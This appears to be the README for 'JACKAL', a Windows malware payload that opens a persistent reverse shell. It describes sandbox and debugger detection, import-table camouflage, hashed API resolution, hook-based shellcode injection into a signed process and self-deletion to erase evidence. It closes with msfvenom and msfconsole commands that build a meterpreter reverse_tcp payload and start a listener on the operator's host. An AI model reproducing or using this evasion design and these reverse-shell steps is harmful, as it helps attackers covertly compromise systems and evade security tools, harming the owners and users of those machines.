# Windows Payload: JACKAL
### Description

This documentation outlines the functionality and implementation details of "JACKAL", a Windows payload designed to establish a persistent reverse shell on a target system. The payload is designed to work in conjunction with the nekrosis framework, leveraging advanced techniques for stealth and evasion.

### Functionality overview

1. **Debugging and Sandbox Detection**: The payload conducts an initial check to determine if it's being debugged or running within a sandbox environment. This is crucial for evading detection and ensuring successful execution.
2. **Import Address Table Camouflage**: To avoid detection, the payload disguises its import address table with whitelisted API functions. This helps to blend in with legitimate system processes and avoid triggering security mechanisms.
3. **Dynamic API Resolution**: The payload dynamically resolves API functions using the custom GetProcessAddressByHash() function. This function utilizes a compile time djb2 hashing algorithm to calculate function hashes, which are then matched against the export address table of specified DLLs to locate the required functions.
4. **Delayed Execution**: The payload introduces delayed execution to wait for a target binary to spawn. This ensures that the payload seamlessly integrates with the target process, enhancing stealth and persistence.
5. **Hook installation and shellcode execution**:
Once the target process is running, the payload locates the address of the WinAPI function to hook within the target process. It then patches the trampoline hook shellcode with the address of the function to hook. Following this, the payload identifies a memory hole adjacent to the DLL exporting the target WinAPI function. The decrypted msfvenom shellcode is injected into this buffer. When the hooked WinAPI function is called in the target process, the injected shellcode is executed. Subsequently, the execution of the target process resumes, establishing a reverse shell connection through the signed binary targeted by the payload.
6. **Self-Deletion**: After successfully establishing the reverse shell, the payload deletes itself to remove evidence of its presence on the system. This helps to maintain stealth and avoid detection by security tools.

### Preparation and Compilation

To ensure a connection can be established to your machine for the reverse shell, a generated payload has to be inserted in the payload array located in payload.cpp. A payload can be generated using msfvenom: 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={listener IP} LPORT={listener port} -f c
```
After the payload is generated and inserted into the code, the code can be compiled using visual studio, and msfconsole can be used as a listener with the following commands
```
msfconsole
msf6 > use windows/x64/meterpreter/reverse_tcp
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LHOST {listener ip}
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LPORT {listener port}
msf6 payload(windows/x64/meterpreter/reverse_tcp) > exploit
```
